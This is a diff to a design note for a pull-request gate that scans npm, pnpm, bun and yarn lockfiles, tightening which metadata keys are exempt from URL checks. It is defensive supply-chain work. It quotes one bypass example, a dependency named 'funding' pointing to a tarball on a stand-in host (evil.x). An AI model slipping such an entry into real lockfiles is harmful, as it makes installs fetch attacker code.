@@ -351,11 +351,22 @@ it, each with the reason. Design: `docs/superpowers/specs/2026-10-24-pr-gate-des
     `package-lock.json`, so checking them made every dependency bump that
     pulled in such a package an un-overridable hit. A small denylist of
     keys, not a narrowing of the URL check to fetch slots: every other
-    string stays checked. The exemption needs both the place (a mapping
-    with `version` or `resolution`, i.e. a package entry) and the shape,
-    so a package or dependency NAMED `funding` or `deprecated` (a v1
-    `dependencies` entry, a dependency-map value) is still checked. Fetch
-    slots are checked structurally as well (below), unaffected.
+    string stays checked. The exemption needs both the place and the
+    shape. The place is structural, by position in each format, never a
+    sibling key: package-lock `packages.<path>` and v1
+    `dependencies.<name>` entries (nested to any depth), pnpm
+    `packages.<key>` / `snapshots.<key>`, bun's metadata object inside a
+    `packages.<name>` tuple, yarn's top-level entries. Any mapping nested
+    in one of those (`dependencies`, `requires`, `peerDependencies`,
+    `overrides`, ...) or elsewhere (pnpm importers, bun workspaces) is a
+    name -> spec map, where a package NAMED `funding`, `deprecated` or
+    `license` is a dependency npm fetches from its spec, so it is checked.
+    (An earlier rule, "a mapping with a `version` sibling", let
+    `dependencies: {version: ^1, funding: https://evil.x/x.tgz}` through.)
+    Exempt values still get the control-character check; only the URL
+    and spec checks are skipped. A YAML alias cannot make one mapping both
+    an entry and a dependency map: aliases do not parse. Fetch slots are
+    checked structurally as well (below), unaffected.
     **Cost:** a legitimate git dependency in an npm-family lockfile is a
     non-overridable hit (it already was whenever a URL to github.com
     appeared, which npm usually writes). **Residual:** a fetch slot this
